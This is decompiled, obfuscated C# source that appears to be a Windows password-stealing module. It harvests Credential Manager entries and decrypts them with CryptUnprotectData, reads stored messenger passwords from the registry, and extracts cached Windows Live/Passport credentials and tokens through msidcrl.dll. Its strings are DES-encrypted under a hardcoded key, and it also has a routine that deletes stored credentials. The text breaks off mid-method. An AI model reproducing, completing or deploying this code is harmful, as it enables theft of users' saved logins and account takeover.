using System;
using System.Collections;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

internal class irmfmnHPbG7XeMZKqma18 : IEnumerable, IEnumerator
{
	private enum GPgYx63zaPrdeCabnJG19
	{
		GENERIC = 1,
		DOMAIN_PASSWORD,
		DOMAIN_CERTIFICATE,
		DOMAIN_VISIBLE_PASSWORD,
		MAXIMUM
	}

	private struct JUDfbnB95WiK5oAFx6C23
	{
		public int dwFlags;

		public int dwType;

		public int lpstrTargetName;

		public int lpstrComment;

		public p5TcjbM93fyFXFn6sDJ21 ftLastWritten;

		public int dwCredentialBlobSize;

		public int lpbCredentialBlob;

		public int dwPersist;

		public int dwAttributeCount;

		public int lpAttributes;

		public int lpstrTargetAlias;

		public int lpUserName;
	}

	private struct p5TcjbM93fyFXFn6sDJ21
	{
		public int dwLowDateTime;

		public int dwHighDateTime;
	}

	private struct QzjtTK6dLnGAPFgkAFh22
	{
		public int lpstrKeyword;

		public int dwFlags;

		public int dwValueSize;

		public int lpbValue;
	}

	private struct yt25qoeDaP3BFQx2kv620
	{
		public int cbData;

		public int pbData;
	}

	private struct ZrcX0LmFJZHlMqaUPcj24
	{
		public string strLogin;

		public string strPass;

		public string strTargetName;
	}

	private const int ERROR_SUCCESS = 0;

	private const int HKEY_CURRENT_USER = -2147483647;

	private const int READ_CONTROL = 131072;

	private const int STANDARD_RIGHTS_READ = 131072;

	private const int KEY_QUERY_VALUE = 1;

	private const int KEY_ENUMERATE_SUB_KEYS = 8;

	private const int KEY_NOTIFY = 16;

	private const int SYNCHRONIZE = 1048576;

	private const int STANDARD_RIGHTS_WRITE = 131072;

	private const int KEY_SET_VALUE = 2;

	private const int KEY_CREATE_SUB_KEY = 4;

	private const int KEY_READ = 131097;

	private const int KEY_WRITE = 131078;

	private const int CSIDL_PROGRAM_FILES = 38;

	private ZrcX0LmFJZHlMqaUPcj24[] GTvgw5ELwwSGn0JwtJa8;

	private int M4XcXMt0emhSIQkp4FV9;

	[SpecialName]
	private byte[] _0024STATIC_0024Base64Dec_0024201E10E_0024Enc;

	public fmYIMNsf0lDfzYX9diR17 this[int Index]
	{
		get
		{
			if ((Index < 0) | (Index >= Count))
			{
				return null;
			}
			fmYIMNsf0lDfzYX9diR17 fmYIMNsf0lDfzYX9diR18 = new fmYIMNsf0lDfzYX9diR17();
			ZrcX0LmFJZHlMqaUPcj24 zrcX0LmFJZHlMqaUPcj = GTvgw5ELwwSGn0JwtJa8[Index];
			fmYIMNsf0lDfzYX9diR18.xa7hxhjP8yCZwAobvyF44(ref zrcX0LmFJZHlMqaUPcj.strLogin, ref zrcX0LmFJZHlMqaUPcj.strPass, ref zrcX0LmFJZHlMqaUPcj.strTargetName);
			return fmYIMNsf0lDfzYX9diR18;
		}
	}

	public int Count
	{
		get
		{
			int try0000_dispatch = -1;
			int num2 = default(int);
			int num3 = default(int);
			int num = default(int);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num2 = 2;
						num3 = 0;
						num3 = checked(Information.UBound((Array)GTvgw5ELwwSGn0JwtJa8, 1) + 1);
						break;
					case 26:
						num = -1;
						switch (num2)
						{
						case 2:
							break;
						default:
							goto IL_0050;
						}
						break;
					}
				}
				catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0000_dispatch = 26;
					continue;
				}
				break;
				IL_0050:
				throw ProjectData.CreateProjectError(-2146828237);
			}
			int result = num3;
			if (num != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}
	}

	public object Current
	{
		get
		{
			fmYIMNsf0lDfzYX9diR17 fmYIMNsf0lDfzYX9diR18 = new fmYIMNsf0lDfzYX9diR17();
			int m4XcXMt0emhSIQkp4FV = M4XcXMt0emhSIQkp4FV9;
			fmYIMNsf0lDfzYX9diR18.xa7hxhjP8yCZwAobvyF44(ref GTvgw5ELwwSGn0JwtJa8[m4XcXMt0emhSIQkp4FV].strLogin, ref GTvgw5ELwwSGn0JwtJa8[m4XcXMt0emhSIQkp4FV].strPass, ref GTvgw5ELwwSGn0JwtJa8[m4XcXMt0emhSIQkp4FV].strTargetName);
			checked
			{
				M4XcXMt0emhSIQkp4FV9++;
				return fmYIMNsf0lDfzYX9diR18;
			}
		}
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int lstrlenA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CredEnumerateW([MarshalAs(UnmanagedType.LPWStr)] string lpszFilter, int lFlags, ref int pCount, ref IntPtr lppCredentials);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "CredEnumerateW", ExactSpelling = true, SetLastError = true)]
	private static extern int CredEnumerateW_1(IntPtr lpszFilter, int lFlags, ref int pCount, ref IntPtr lppCredentials);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CredDeleteW([MarshalAs(UnmanagedType.LPWStr)] string lpwstrTargetName, int dwType, int dwFlags);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CredFree(IntPtr pBuffer);

	[DllImport("crypt32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CryptUnprotectData(ref yt25qoeDaP3BFQx2kv620 pDataIn, int ppszDataDescr, ref yt25qoeDaP3BFQx2kv620 pOptionalEntropy, int pvReserved, int pPromptStruct, int dwFlags, ref yt25qoeDaP3BFQx2kv620 pDataOut);

	[DllImport("crypt32.dll", CharSet = CharSet.Ansi, EntryPoint = "CryptUnprotectData", ExactSpelling = true, SetLastError = true)]
	private static extern int CryptUnprotectData_1(ref yt25qoeDaP3BFQx2kv620 pDataIn, int ppszDataDescr, int pOptionalEntropy, int pvReserved, int pPromptStruct, int dwFlags, ref yt25qoeDaP3BFQx2kv620 pDataOut);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegOpenKeyExA(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpSubKey, int ulOptions, int samDesired, ref int phkResult);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegQueryValueExA(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName, int lpReserved, ref int lpType, [MarshalAs(UnmanagedType.LPWStr)] string lpData, ref int lpcbData);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "RegQueryValueExA", ExactSpelling = true, SetLastError = true)]
	private static extern int RegQueryValueExA_1(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName, int lpReserved, ref int lpType, IntPtr lpData, ref int lpcbData);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegEnumKeyExA(int hKey, int dwIndex, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpName, ref int lpcbName, int lpReserved, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClass, int lpcbClass, ref p5TcjbM93fyFXFn6sDJ21 lpftLastWriteTime);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegDeleteValueA(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int LocalFree(int hMem);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegCloseKey(int hKey);

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SHGetSpecialFolderLocation(int hwndOwner, int nFolder, ref int pidl);

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SHGetPathFromIDListA(int pidl, [MarshalAs(UnmanagedType.VBByRefStr)] ref string pszPath);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int Initialize(ref GStruct1 guid, int IDCRLVersion, int dwFlags);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int EnumIdentitiesWithCachedCredentials([MarshalAs(UnmanagedType.LPWStr)] string wszCachedCredType, ref int phEnumHandle);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int NextIdentity(int hEnumHandle, ref IntPtr lpwszMemberName);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int PassportFreeMemory(IntPtr ptr);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CloseEnumIdentitiesHandle(int hEnumHandle);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CreateIdentityHandle([MarshalAs(UnmanagedType.LPWStr)] string wszMemberName, int dwFlags, ref int lphExternalIdentity);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, EntryPoint = "CreateIdentityHandle", ExactSpelling = true, SetLastError = true)]
	private static extern int CreateIdentityHandle_1(IntPtr wszMemberName, int dwFlags, ref int lphExternalIdentity);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int HasPersistedCredential(int hExternalIdentity, [MarshalAs(UnmanagedType.LPWStr)] string wszCredType, ref int lpbPersisted);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RemovePersistedCredential(int hExternalIdentity, [MarshalAs(UnmanagedType.LPWStr)] string wszCredType);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetIdentityPropertyByName(int hExternalIdentity, [MarshalAs(UnmanagedType.LPWStr)] string wszPropertyName, ref int lpszValue);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int BuildAuthTokenRequest(int hExternalIdentity, [MarshalAs(UnmanagedType.LPWStr)] string wszPolicy, int dwFlags, ref IntPtr lpReturn);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CloseIdentityHandle(int hExternalIdentity);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int Uninitialize();

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpLibFileName);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FreeLibrary(int hLibModule);

	private string QfITpgqVcDWoUMKPbRZ76()
	{
		int pidl = default(int);
		string result;
		if (SHGetSpecialFolderLocation(0, 38, ref pidl) == 0)
		{
			string pszPath = new string('\0', 512);
			int num = SHGetPathFromIDListA(pidl, ref pszPath);
			result = Strings.Left(pszPath, checked(Strings.InStr(pszPath, "\0", (CompareMethod)0) - 1));
		}
		else
		{
			result = null;
		}
		LocalFree(pidl);
		return result;
	}

	private string method_0(string strText, string sDecrKey)
	{
		try
		{
			byte[] rgbIV = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };
			byte[] array = new byte[checked(strText.Length + 1)];
			byte[] bytes = Encoding.UTF8.GetBytes(Strings.Left(sDecrKey, 8));
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			array = Convert.FromBase64String(strText);
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateDecryptor(bytes, rgbIV), CryptoStreamMode.Write);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.FlushFinalBlock();
			Encoding uTF = Encoding.UTF8;
			return uTF.GetString(memoryStream.ToArray());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void SM9GMz2Ak5tHfKVRhKw78(ref int ub)
	{
		string lpLibFileName = QfITpgqVcDWoUMKPbRZ76() + method_0("EA4JV0Ui8748ZZ/DXx57K0cxtw3bP5LctlmBtdcr0ig=", "12345#$%");
		if (Operators.CompareString(FileSystem.Dir(lpLibFileName, (FileAttribute)0), (string)null, false) == 0)
		{
			return;
		}
		int hLibModule = LoadLibraryA(ref lpLibFileName);
		GStruct1 guid = default(GStruct1);
		guid.Data4 = new byte[8];
		guid.Data1 = 1896408858;
		guid.Data2 = -26330;
		guid.Data3 = 20427;
		guid.Data4[0] = 188;
		guid.Data4[1] = 201;
		guid.Data4[2] = 154;
		guid.Data4[3] = 157;
		guid.Data4[4] = 63;
		guid.Data4[5] = 50;
		guid.Data4[6] = 228;
		guid.Data4[7] = 35;
		Initialize(ref guid, 1, 15);
		int phEnumHandle = default(int);
		IntPtr lpwszMemberName = default(IntPtr);
		int lphExternalIdentity = default(int);
		int lpbPersisted = default(int);
		if (EnumIdentitiesWithCachedCredentials(method_0("2NGrkYDCHuyPKUaIHPbn/Q==", "12345#$%"), ref phEnumHandle) == 0)
		{
			IntPtr lpReturn = default(IntPtr);
			for (int num = NextIdentity(phEnumHandle, ref lpwszMemberName); num == 0; num = NextIdentity(phEnumHandle, ref lpwszMemberName))
			{
				num = CreateIdentityHandle_1(lpwszMemberName, 255, ref lphExternalIdentity);
				if ((num == 0) & (lpwszMemberName != IntPtr.Zero))
				{
					num = HasPersistedCredential(lphExternalIdentity, method_0("2NGrkYDCHuyPKUaIHPbn/Q==", "12345#$%"), ref lpbPersisted);
					if (num == 0 && lpbPersisted != 0)
					{
						checked
						{
							if (BuildAuthTokenRequest(lphExternalIdentity, method_0("2NGrkYDCHuyPKUaIHPbn/Q==", "12345#$%"), 0, ref lpReturn) == 0)
							{
								string text = OHBuKRZDAoSKHWSsmip81(lpReturn);
								int num2 = Strings.InStr(text, method_0("2wm3YZnf7HZzbNob5J62Ow==", "12345#$%"), (CompareMethod)0) + 15;
								int num3 = Strings.InStr(text, method_0("M+aaZd4Qk9Hn1BuHuUYc6ONxHeOgK/kb", "12345#$%"), (CompareMethod)0);
								if (num3 > 0)
								{
									GTvgw5ELwwSGn0JwtJa8 = (ZrcX0LmFJZHlMqaUPcj24[])Utils.CopyArray((Array)GTvgw5ELwwSGn0JwtJa8, (Array)new ZrcX0LmFJZHlMqaUPcj24[ub + 1]);
									int num4 = ub;
									GTvgw5ELwwSGn0JwtJa8[num4].strLogin = OHBuKRZDAoSKHWSsmip81(lpwszMemberName);
									GTvgw5ELwwSGn0JwtJa8[num4].strPass = Strings.Mid(text, num2, num3 - num2);
									GTvgw5ELwwSGn0JwtJa8[num4].strTargetName = "ps:" + GTvgw5ELwwSGn0JwtJa8[num4].strLogin;
									ub++;
								}
							}
							if (lpReturn != IntPtr.Zero)
							{
								PassportFreeMemory(lpReturn);
							}
						}
					}
					num = CloseIdentityHandle(lphExternalIdentity);
				}
				if (lpwszMemberName != IntPtr.Zero)
				{
					PassportFreeMemory(lpwszMemberName);
				}
			}
		}
		CloseEnumIdentitiesHandle(phEnumHandle);
		if (EnumIdentitiesWithCachedCredentials(method_0("7RxDBZUWSRpxLG9yAQLKbEv86LQWS19u", "12345#$%"), ref phEnumHandle) == 0)
		{
			for (int num = NextIdentity(phEnumHandle, ref lpwszMemberName); num == 0; num = NextIdentity(phEnumHandle, ref lpwszMemberName))
			{
				num = CreateIdentityHandle_1(lpwszMemberName, 255, ref lphExternalIdentity);
				if ((num == 0) & (lpwszMemberName != IntPtr.Zero))
				{
					num = HasPersistedCredential(lphExternalIdentity, method_0("2NGrkYDCHuyPKUaIHPbn/Q==", "12345#$%"), ref lpbPersisted);
					if (num == 0 && lpbPersisted == 0)
					{
						checked
						{
							GTvgw5ELwwSGn0JwtJa8 = (ZrcX0LmFJZHlMqaUPcj24[])Utils.CopyArray((Array)GTvgw5ELwwSGn0JwtJa8, (Array)new ZrcX0LmFJZHlMqaUPcj24[ub + 1]);
							int num5 = ub;
							GTvgw5ELwwSGn0JwtJa8[num5].strLogin = OHBuKRZDAoSKHWSsmip81(lpwszMemberName);
							GTvgw5ELwwSGn0JwtJa8[num5].strPass = "";
							GTvgw5ELwwSGn0JwtJa8[num5].strTargetName = "ps:" + GTvgw5ELwwSGn0JwtJa8[num5].strLogin;
							ub++;
						}
					}
					num = CloseIdentityHandle(lphExternalIdentity);
				}
				if (lpwszMemberName != IntPtr.Zero)
				{
					PassportFreeMemory(lpwszMemberName);
				}
			}
		}
		CloseEnumIdentitiesHandle(phEnumHandle);
		Uninitialize();
		FreeLibrary(hLibModule);
	}

	public void ZlnIkYb5hJlsSinZdUo79()
	{
		GTvgw5ELwwSGn0JwtJa8 = null;
		int ub = 0;
		string lpSubKey = method_0("8DYu61PVOq2FZMLQdWt4I+/kGim2ul8u7e2zNVqcjYdxv9iEaJtD6g==", "12345#$%");
		int phkResult = default(int);
		int num = RegOpenKeyExA(-2147483647, ref lpSubKey, 0, 131097, ref phkResult);
		int lpcbData = 0;
		int hKey = phkResult;
		lpSubKey = method_0("5yqXvOobmBWjYQ+U9huFGToHAA8jKsNg0ZdYl78UxeI=", "12345#$%");
		int lpType = default(int);
		num = RegQueryValueExA_1(hKey, ref lpSubKey, 0, ref lpType, IntPtr.Zero, ref lpcbData);
		checked
		{
			string text;
			if (lpcbData > 0)
			{
				IntPtr intPtr = Marshal.AllocHGlobal(lpcbData);
				int hKey2 = phkResult;
				lpSubKey = method_0("5yqXvOobmBWjYQ+U9huFGToHAA8jKsNg0ZdYl78UxeI=", "12345#$%");
				num = RegQueryValueExA_1(hKey2, ref lpSubKey, 0, ref lpType, intPtr, ref lpcbData);
				text = Marshal.PtrToStringAnsi(intPtr);
				Marshal.FreeHGlobal(intPtr);
				text = Strings.Mid(text, 1, Strings.Len(text) - 1);
				GTvgw5ELwwSGn0JwtJa8 = new ZrcX0LmFJZHlMqaUPcj24[1];
				GTvgw5ELwwSGn0JwtJa8[0].strPass = bbdVVJ4DWfxQbKHmkXs84(ref text);
				lpcbData = 0;
				int hKey3 = phkResult;
				lpSubKey = method_0("LJvbRRfi92F+T5sdUcoVeEDw5qat1xmCqEtfms+PN+4=", "12345#$%");
				num = RegQueryValueExA_1(hKey3, ref lpSubKey, 0, ref lpType, IntPtr.Zero, ref lpcbData);
				intPtr = Marshal.AllocHGlobal(lpcbData);
				int hKey4 = phkResult;
				lpSubKey = method_0("LJvbRRfi92F+T5sdUcoVeEDw5qat1xmCqEtfms+PN+4=", "12345#$%");
				num = RegQueryValueExA_1(hKey4, ref lpSubKey, 0, ref lpType, intPtr, ref lpcbData);
				GTvgw5ELwwSGn0JwtJa8[0].strLogin = Marshal.PtrToStringAnsi(intPtr);
				Marshal.FreeHGlobal(intPtr);
				GTvgw5ELwwSGn0JwtJa8[0].strLogin = Strings.Mid(GTvgw5ELwwSGn0JwtJa8[0].strLogin, 1, Strings.Len(GTvgw5ELwwSGn0JwtJa8[0].strLogin) - 1);
				ub++;
				RegCloseKey(phkResult);
			}
			RegCloseKey(phkResult);
			lpSubKey = method_0("8DYu61PVOq2FZMLQdWt4I2soxcIHGyEfqCSEVbWZgNc=", "12345#$%");
			yt25qoeDaP3BFQx2kv620 pDataIn = default(yt25qoeDaP3BFQx2kv620);
			yt25qoeDaP3BFQx2kv620 pDataOut = default(yt25qoeDaP3BFQx2kv620);
			if (RegOpenKeyExA(-2147483647, ref lpSubKey, 0, 131097, ref phkResult) == 0)
			{
				lpcbData = 0;
				int hKey5 = phkResult;
				lpSubKey = method_0("5yqXvOobmBXf7FIWvrPp6xBpSVJvL4lBvoArca+IWcA=", "12345#$%");
				if (RegQueryValueExA_1(hKey5, ref lpSubKey, 0, ref lpType, IntPtr.Zero, ref lpcbData) == 0)
				{
					IntPtr intPtr = Marshal.AllocHGlobal(lpcbData);
					int hKey6 = phkResult;
					lpSubKey = method_0("5yqXvOobmBXf7FIWvrPp6xBpSVJvL4lBvoArca+IWcA=", "12345#$%");
					if (RegQueryValueExA_1(hKey6, ref lpSubKey, 0, ref lpType, intPtr, ref lpcbData) != 0)
					{
						return;
					}
					GTvgw5ELwwSGn0JwtJa8 = (ZrcX0LmFJZHlMqaUPcj24[])Utils.CopyArray((Array)GTvgw5ELwwSGn0JwtJa8, (Array)new ZrcX0LmFJZHlMqaUPcj24[ub + 1]);
					pDataIn.pbData = intPtr.ToInt32() + 2;
					pDataIn.cbData = lpcbData - 2;
					CryptUnprotectData_1(ref pDataIn, 0, 0, 0, 0, 1, ref pDataOut);
					string Base64String = Marshal.PtrToStringAnsi(intPtr);
					Marshal.FreeHGlobal(intPtr);
					int num2 = ub;
					GTvgw5ELwwSGn0JwtJa8[num2].strPass = bbdVVJ4DWfxQbKHmkXs84(ref Base64String);
					lpcbData = 0;
					int hKey7 = phkResult;
					lpSubKey = method_0("+dVN7/QV13r+DgRv6X7TvCPIHnvrpiIO5YkIE/WA0Yc=", "12345#$%");
					num = RegQueryValueExA_1(hKey7, ref lpSubKey, 0, ref lpType, IntPtr.Zero, ref lpcbData);
					intPtr = Marshal.AllocHGlobal(lpcbData);
					int hKey8 = phkResult;
					lpSubKey = method_0("+dVN7/QV13r+DgRv6X7TvCPIHnvrpiIO5YkIE/WA0Yc=", "12345#$%");
					num = RegQueryValueExA_1(hKey8, ref lpSubKey, 0, ref lpType, intPtr, ref lpcbData);
					GTvgw5ELwwSGn0JwtJa8[num2].strLogin = Marshal.PtrToStringAnsi(intPtr);
					Marshal.FreeHGlobal(intPtr);
					GTvgw5ELwwSGn0JwtJa8[num2].strLogin = Strings.Mid(GTvgw5ELwwSGn0JwtJa8[num2].strLogin, 1, Strings.Len(GTvgw5ELwwSGn0JwtJa8[num2].strLogin) - 1);
					ub++;
					LocalFree(pDataOut.pbData);
				}
			}
			text = method_0("Tgwk53CSmXfcKjdaJc0r6Q==", "12345#$%");
			int pCount = default(int);
			IntPtr lppCredentials = default(IntPtr);
			CredEnumerateW(text, 0, ref pCount, ref lppCredentials);
			JUDfbnB95WiK5oAFx6C23 jUDfbnB95WiK5oAFx6C = default(JUDfbnB95WiK5oAFx6C23);
			JUDfbnB95WiK5oAFx6C23 jUDfbnB95WiK5oAFx6C2 = default(JUDfbnB95WiK5oAFx6C23);
			int i;
			if (pCount > 0)
			{
				yt25qoeDaP3BFQx2kv620 pOptionalEntropy = default(yt25qoeDaP3BFQx2kv620);
				pOptionalEntropy.cbData = 74;
				IntPtr intPtr2 = Marshal.AllocHGlobal(74);
				string text2 = method_0("PPK1dshgmxnwx85Gl1tiCr9sN7TipBHZTn33umFvdUTSy1vfo/Df8A==", "12345#$%") + "\0";
				int num3 = 0;
				do
				{
					Marshal.WriteInt16(intPtr2, num3 * 2, (short)(Strings.Asc(Strings.Mid(text2, num3 + 1, 1)) * 4));
					num3++;
				}
				while (num3 <= 36);
				pOptionalEntropy.pbData = intPtr2.ToInt32();
				GTvgw5ELwwSGn0JwtJa8 = (ZrcX0LmFJZHlMqaUPcj24[])Utils.CopyArray((Array)GTvgw5ELwwSGn0JwtJa8, (Array)new ZrcX0LmFJZHlMqaUPcj24[ub + pCount - 1 + 1]);
				int num4 = ub;
				int num5 = ub + pCount - 1;
				for (i = num4; i <= num5; i++)
				{
					IntPtr intPtr = Marshal.ReadIntPtr(lppCredentials, (i - ub) * 4);
					object? obj = Marshal.PtrToStructure(intPtr, jUDfbnB95WiK5oAFx6C.GetType());
					jUDfbnB95WiK5oAFx6C = ((obj != null) ? ((JUDfbnB95WiK5oAFx6C23)obj) : jUDfbnB95WiK5oAFx6C2);
					pDataIn.pbData = jUDfbnB95WiK5oAFx6C.lpbCredentialBlob;
					pDataIn.cbData = jUDfbnB95WiK5oAFx6C.dwCredentialBlobSize;
					pDataOut.cbData = 0;
					pDataOut.pbData = 0;
					CryptUnprotectData(ref pDataIn, 0, ref pOptionalEntropy, 0, 0, 0, ref pDataOut);
					int num6 = i;
					ref ZrcX0LmFJZHlMqaUPcj24 reference = ref GTvgw5ELwwSGn0JwtJa8[num6];
					IntPtr ptr = new IntPtr(jUDfbnB95WiK5oAFx6C.lpUserName);
					reference.strLogin = OHBuKRZDAoSKHWSsmip81(ptr);
					ref ZrcX0LmFJZHlMqaUPcj24 reference2 = ref GTvgw5ELwwSGn0JwtJa8[num6];
					ptr = new IntPtr(jUDfbnB95WiK5oAFx6C.lpstrTargetName);
					reference2.strTargetName = OHBuKRZDAoSKHWSsmip81(ptr);
					ref ZrcX0LmFJZHlMqaUPcj24 reference3 = ref GTvgw5ELwwSGn0JwtJa8[num6];
					ptr = new IntPtr(pDataOut.pbData);
					reference3.strPass = OHBuKRZDAoSKHWSsmip81(ptr);
					LocalFree(pDataOut.pbData);
				}
				Marshal.FreeHGlobal(intPtr2);
				ub += pCount;
			}
			CredFree(lppCredentials);
			SM9GMz2Ak5tHfKVRhKw78(ref ub);
			RegCloseKey(phkResult);
			byte[] array = new byte[18]
			{
				38, 48, 111, 102, 81, 101, 56, 82, 98, 108,
				78, 100, 103, 110, 90, 83, 85, 74
			};
			IntPtr intPtr3 = Marshal.AllocHGlobal(38);
			i = 0;
			do
			{
				byte val = (byte)(unchecked((int)checked((byte)(array[17 - i] ^ 0xC))) + (17 - i));
				Marshal.WriteInt16(intPtr3, i * 2, val);
				i++;
			}
			while (i <= 17);
			Marshal.WriteInt16(intPtr3, 36, 0);
			CredEnumerateW_1(intPtr3, 0, ref pCount, ref lppCredentials);
			if (pCount > 0)
			{
				GTvgw5ELwwSGn0JwtJa8 = (ZrcX0LmFJZHlMqaUPcj24[])Utils.CopyArray((Array)GTvgw5ELwwSGn0JwtJa8, (Array)new ZrcX0LmFJZHlMqaUPcj24[ub + pCount - 1 + 1]);
				int num7 = ub;
				int num8 = ub + pCount - 1;
				for (i = num7; i <= num8; i++)
				{
					IntPtr intPtr = Marshal.ReadIntPtr(lppCredentials, (i - ub) * 4);
					object? obj2 = Marshal.PtrToStructure(intPtr, jUDfbnB95WiK5oAFx6C.GetType());
					jUDfbnB95WiK5oAFx6C = ((obj2 != null) ? ((JUDfbnB95WiK5oAFx6C23)obj2) : jUDfbnB95WiK5oAFx6C2);
					pDataIn.pbData = jUDfbnB95WiK5oAFx6C.lpbCredentialBlob;
					pDataIn.cbData = jUDfbnB95WiK5oAFx6C.dwCredentialBlobSize;
					CryptUnprotectData_1(ref pDataIn, 0, 0, 0, 0, 1, ref pDataOut);
					pDataOut.pbData = pDataIn.pbData;
					int num9 = i;
					ref ZrcX0LmFJZHlMqaUPcj24 reference4 = ref GTvgw5ELwwSGn0JwtJa8[num9];
					IntPtr ptr = new IntPtr(jUDfbnB95WiK5oAFx6C.lpUserName);
					reference4.strLogin = OHBuKRZDAoSKHWSsmip81(ptr);
					ref ZrcX0LmFJZHlMqaUPcj24 reference5 = ref GTvgw5ELwwSGn0JwtJa8[num9];
					ptr = new IntPtr(jUDfbnB95WiK5oAFx6C.lpstrTargetName);
					reference5.strTargetName = OHBuKRZDAoSKHWSsmip81(ptr);
					ref ZrcX0LmFJZHlMqaUPcj24 reference6 = ref GTvgw5ELwwSGn0JwtJa8[num9];
					ptr = new IntPtr(pDataOut.pbData);
					reference6.strPass = Marshal.PtrToStringUni(ptr, (int)Math.Round((double)pDataIn.cbData / 2.0));
				}
				ub += pCount;
			}
			CredFree(lppCredentials);
			Marshal.FreeHGlobal(intPtr3);
		}
	}

	private void i9HWHrCeLNJNhzmxsu380(string lpszCredPattern)
	{
		int pCount = default(int);
		IntPtr lppCredentials = default(IntPtr);
		CredEnumerateW(lpszCredPattern, 0, ref pCount, ref lppCredentials);
		checked
		{
			if (pCount > 0)
			{
				int num = pCount - 1;
				JUDfbnB95WiK5oAFx6C23 jUDfbnB95WiK5oAFx6C = default(JUDfbnB95WiK5oAFx6C23);
				JUDfbnB95WiK5oAFx6C23 jUDfbnB95WiK5oAFx6C2 = default(JUDfbnB95WiK5oAFx6C23);
				for (int i = 0; i <= num; i++)
				{
					IntPtr ptr = Marshal.ReadIntPtr(lppCredentials, i * 4);
					object? obj = Marshal.PtrToStructure(ptr, jUDfbnB95WiK5oAFx6C.GetType());
					jUDfbnB95WiK5oAFx6C = ((obj != null) ? ((JUDfbnB95WiK5oAFx6C23)obj) : jUDfbnB95WiK5oAFx6C2);
					IntPtr ptr2 = new IntPtr(jUDfbnB95WiK5oAFx6C.lpstrTargetName);
					string lpwstrTargetName = OHBuKRZDAoSKHWSsmip81(ptr2);
					CredDeleteW(lpwstrTargetName, jUDfbnB95WiK5oAFx6C.dwType, jUDfbnB95WiK5oAFx6C.dwFlags);
				}
			}
			CredFree(lppCredentials);
		}
	}

	protected string OHBuKRZDAoSKHWSsmip81(IntPtr ptr)
	{
		return Marshal.PtrToStringUni(ptr);
	}

	private void FgIJpixW3TwLVua6HHF82(IntPtr lpszCredPattern)
	{
		int pCount = default(int);
		IntPtr lppCredentials = default(IntPtr);
